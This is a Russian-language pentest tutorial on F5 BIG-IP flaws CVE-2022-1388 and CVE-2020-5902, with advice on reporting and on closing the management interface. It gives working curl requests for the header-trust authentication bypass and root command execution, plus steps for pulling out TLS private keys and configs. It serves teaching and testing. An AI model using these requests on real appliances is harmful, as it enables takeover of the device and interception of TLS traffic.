## Вопрос, с которого всё начинается

На периметре стоит балансировщик F5 BIG-IP. Через него идёт весь трафик к внутренним сервисам, а управляется он через REST-API **iControl**. В 2022 году нашли CVE-2022-1388: обход аутентификации в этом API, после которого одна команда даёт RCE. Разберём, как это работает.

## Что такое F5 BIG-IP и iControl REST

**F5 BIG-IP** — это балансировщик нагрузки и application delivery controller. Он распределяет трафик между серверами, терминирует TLS, делает WAF. Управление — через **iControl REST**: набор эндпоинтов под `/mgmt/tm/`, через которые настраиваются пулы, виртуальные серверы, правила.

Ключевой для нас эндпоинт — `/mgmt/tm/util/bash`. Это легитимный служебный эндпоинт: он позволяет выполнить команду оболочки на устройстве (используется для администрирования). Если до него добраться без аутентификации — это готовый RCE.

## Наш пример: BIG-IP 16.1.0

Цель — `https://bigip.target.example`. Определяем продукт:

```
$ curl -s -k -I https://bigip.target.example/tmui/login.jsp | grep -i server
Server: BIG-IP
Set-Cookie: BIGIPAuthCookie=...
```

Версию уточняем по `/mgmt/tm/sys/version` (если доступ) или по статике. Диапазон CVE-2022-1388: 16.1.0–16.1.2, 15.1.0–15.1.5, 14.1.0–14.1.4, 13.1.0–13.1.4.

## Шаг 1: понять обход аутентификации

CVE-2022-1388 — это **header trust abuse**. BIG-IP проверяет аутентификацию через заголовок `X-F5-Auth-Token`. Если запрос приходит с заголовком `Connection: X-F5-Auth-Token` (что говорит прокси «не пересылай этот заголовок»), то внутренний компонент видит пустой токен и **пропускает запрос** как доверенный. То есть баг в логике доверия к заголовку, а не в криптографии.

## Шаг 2: подтвердить обход

Проверяем неразрушающе — запрашиваем безобидный служебный эндпоинт:

```
$ curl -s -k 'https://bigip.target.example/mgmt/tm/util/bash' \
  -H 'Connection: X-F5-Auth-Token' \
  -H 'X-F5-Auth-Token: ' -o /dev/null -w '%{http_code}\n'
200
```

Ответ `200` без логина — обход подтверждён. (Обычно без токена здесь был бы `401`.)

## Шаг 3: выполнить команду

Теперь отправляем команду через тот же эндпоинт:

```
$ curl -s -k -X POST 'https://bigip.target.example/mgmt/tm/util/bash' \
  -H 'Connection: X-F5-Auth-Token' \
  -H 'X-F5-Auth-Token: ' \
  -H 'Content-Type: application/json' \
  --data-binary '{"command":"run","utilCmdArgs":"-c id"}'
```

Ответ содержит вывод команды:

```
{
  "kind": "tm:util:bash:runstate",
  "commandResult": "uid=0(root) gid=0(root) groups=0(root)\n"
}
```

`uid=0` — мы выполнили код от **root**. Это полный контроль над балансировщиком.

## Шаг 4: второй вектор — TMUI CVE-2020-5902

Если версия старая (11.x–15.1.0), есть ещё CVE-2020-5902: RCE через **TMUI** (веб-интерфейс управления) с обходом пути:

```
$ curl -s -k 'https://bigip.target.example/tmui/login.jsp/..%2f..%2ftmui/..%2fmgmt/tm/util/bash' ...
```

Баг в неверной нормализации пути (`..%2f`). Оба вектора ведут к одному — выполнению команд от root.

## Шаг 5: пост-эксплуатация

BIG-IP хранит много ценного:

- `/config/bigip.conf` — конфигурация со всеми виртуальными серверами и пулами.
- `/config/bigip_ssl.key` и сертификаты — приватные ключи TLS (перехват трафика!).
- Креды к бэкенд-серверам и мониторингу.
- Правила iRules (могут содержать логику с секретами).

С приватными ключами можно расшифровывать трафик — это критично.

## Шаг 6: если пропатчен

Смотрим CVE-2023-46747 (AJP-обход → RCE), CVE-2023-22374, CVE-2021-22986. F5 — большая поверхность. И всегда проверяй версию: она определяет, какой из десятков CVE применим.

## Что мы теперь знаем

- F5 BIG-IP управляется через iControl REST (`/mgmt/tm/`).
- `/mgmt/tm/util/bash` — легитимный RCE-эндпоинт.
- CVE-2022-1388 — обход аутентификации через заголовки (header trust abuse).
- CVE-2020-5902 — RCE через TMUI (traversal).
- После RCE — приватные ключи TLS и конфиги.

## Разбираем header trust abuse на пальцах

Почему вообще шлюз доверяет заголовку? Дело в архитектуре. BIG-IP внутри состоит из нескольких процессов: один принимает запрос снаружи, другой выполняет административные операции. Внешний процесс должен передать внутреннему «кто пришёл» — и делает это **заголовком**. Внутренний процесс считает, что заголовок поставил внешний, и доверяет ему.

Уязвимость CVE-2022-1388 в том, что проверку можно обойти конструкцией из двух заголовков. `Connection: X-F5-Auth-Token` говорит: «этот заголовок — hop-by-hop, не пересылай его дальше». Внешний процесс вырезает `X-F5-Auth-Token` из запроса. Внутренний процесс не находит токен — и по логике «нет токена, но есть соединение» считает запрос доверенным. Пустой токен превращается в «свой».

Мораль общая для всех appliance: если аутентификация основана на заголовке, а не на криптографической подписи, её рано или поздно обойдут. Проверяя продукт, ищи именно такие места.

## Шаг 7: как найти уязвимую версию без сканера

Иногда API версии закрыт. Тогда версию снимают по косвенным признакам: статике JavaScript (в `/tmui/` есть файлы с номером сборки), заголовкам, странице логина. Также помогает `nuclei` с шаблоном `CVE-2022-1388`:

```
$ nuclei -u https://bigip.target.example -tags f5 -silent
[CVE-2022-1388] [http] [critical] https://bigip.target.example/mgmt/tm/util/bash
```

Nuclei проверяет неразрушающе — только код ответа, без выполнения команд. Это правильный первый шаг: он подтверждает наличие бага, не меняя состояние.

## Шаг 8: что писать в отчёте

Отчёт по F5 фиксирует: версию и её источник; CVE (1388 и/или 5902) с диапазоном; тип (pre-auth); доказательство (запрос с заголовками + ответ `uid=0`); **что за BIG-IP** (какие виртуальные серверы, какие ключи); импакт (приватные ключи TLS = перехват трафика); рекомендацию (патч до фиксированной сборки, закрытие management-интерфейса от интернета).

## Ошибки и антипаттерны

Первая ошибка — оставить management-порт открытым в интернет: iControl REST вообще не должен быть доступен снаружи, даже уязвимый. Вторая — запускать полную команду `id` в отчёте, когда достаточно `echo`. Третья — не проверить версию и стрелять payload'ом от неверной версии: для CVE-2022-1388 и CVE-2020-5902 различаются и заголовки, и пути.

## Практический чек-лист по BIG-IP

Собираем всё в порядок действий. Сначала обнаружение: `nmap -p443,8443,8080 <ip>`, затем `curl -I https://<ip>/tmui/login.jsp` — заголовок `Server: BIG-IP` подтверждает продукт. Дальше версия: `/mgmt/tm/sys/version`, а если закрыт — статика `/tmui/` и `nuclei -tags f5`. Затем выбор CVE: для свежих сборок — CVE-2022-1388, для старых — CVE-2020-5902, для AJP — CVE-2023-46747. Проверка: запрос к `/mgmt/tm/util/bash` с заголовками обхода и пустым телом — ждём `200` вместо `401`. Доказательство: `{"command":"run","utilCmdArgs":"-c id"}` и фиксация `uid=0`. Пост-эксплуатация: `/config/bigip.conf`, ключи TLS, креды бэкендов. Отчёт: версия, CVE, запрос, ответ, импакт на ключи.

Такой порядок универсален для любого appliance — меняется только продукт и эндпоинты.

## Сравнение двух главных CVE F5

| CVE | Тип | Механизм | Pre-auth |
|---|---|---|---|
| CVE-2022-1388 | Auth bypass → RCE | header trust (`Connection`/`X-F5-Auth-Token`) | да |
| CVE-2020-5902 | RCE | path traversal в TMUI (`..%2f`) | да |
| CVE-2023-46747 | Auth bypass → RCE | AJP-конфузия | да |
| CVE-2021-22986 | RCE | iControl REST | да |

Обе главные уязвимости pre-auth, обе ведут к root. Поэтому F5 BIG-IP — одно из самых опасных устройств на периметре: незакрытый management-интерфейс означает полный контроль над балансировщиком, а через ключи TLS — и над трафиком.

## Разбор реального инцидента: почему management-интерфейс нельзя открывать

Исторически самая частая причина компрометации F5 — не хитрый баг, а доступность management-интерфейса из интернета. Администраторы открывали порт 443 управления «чтобы удобно было заходить», и вместе с ним открывали iControl REST всему миру. Тогда любая CVE в этом API становится pre-auth для всех.

Правильная архитектура: management-интерфейс доступен только из внутренней админской сети (VPN, jump-host), а не из интернета. Тогда даже уязвимый BIG-IP не эксплуатируется снаружи. При пентесте это хорошая проверка «гигиены»: если `/mgmt/tm/` отвечает из интернета — это уже находка уровня high, независимо от CVE.

Второй урок инцидентов: F5 хранит приватные ключи TLS в открытом виде на диске. Значит, RCE на балансировщике = компрометация **всех** сайтов, которые он обслуживает: можно расшифровать их трафик, подделать сертификаты, провести MITM. Поэтому импакт F5 в отчёте оценивают не как «один сервер», а как «вся TLS-инфраструктура за балансировщиком».

## Что проверить, если всё закрыто

Если и CVE не подошли, и management недоступен — проверь: сертификаты и их сроки (просроченный или самоподписанный может указывать на dev-устройство), SNMP-строки (иногда открыт `public`), iRules через другие эндпоинты. Балансировщик — это большой продукт, и поверхность у него шире, чем один API. Но помни про приоритет: если рядом стоит непропатченный VPN-шлюз с pre-auth RCE, он важнее.
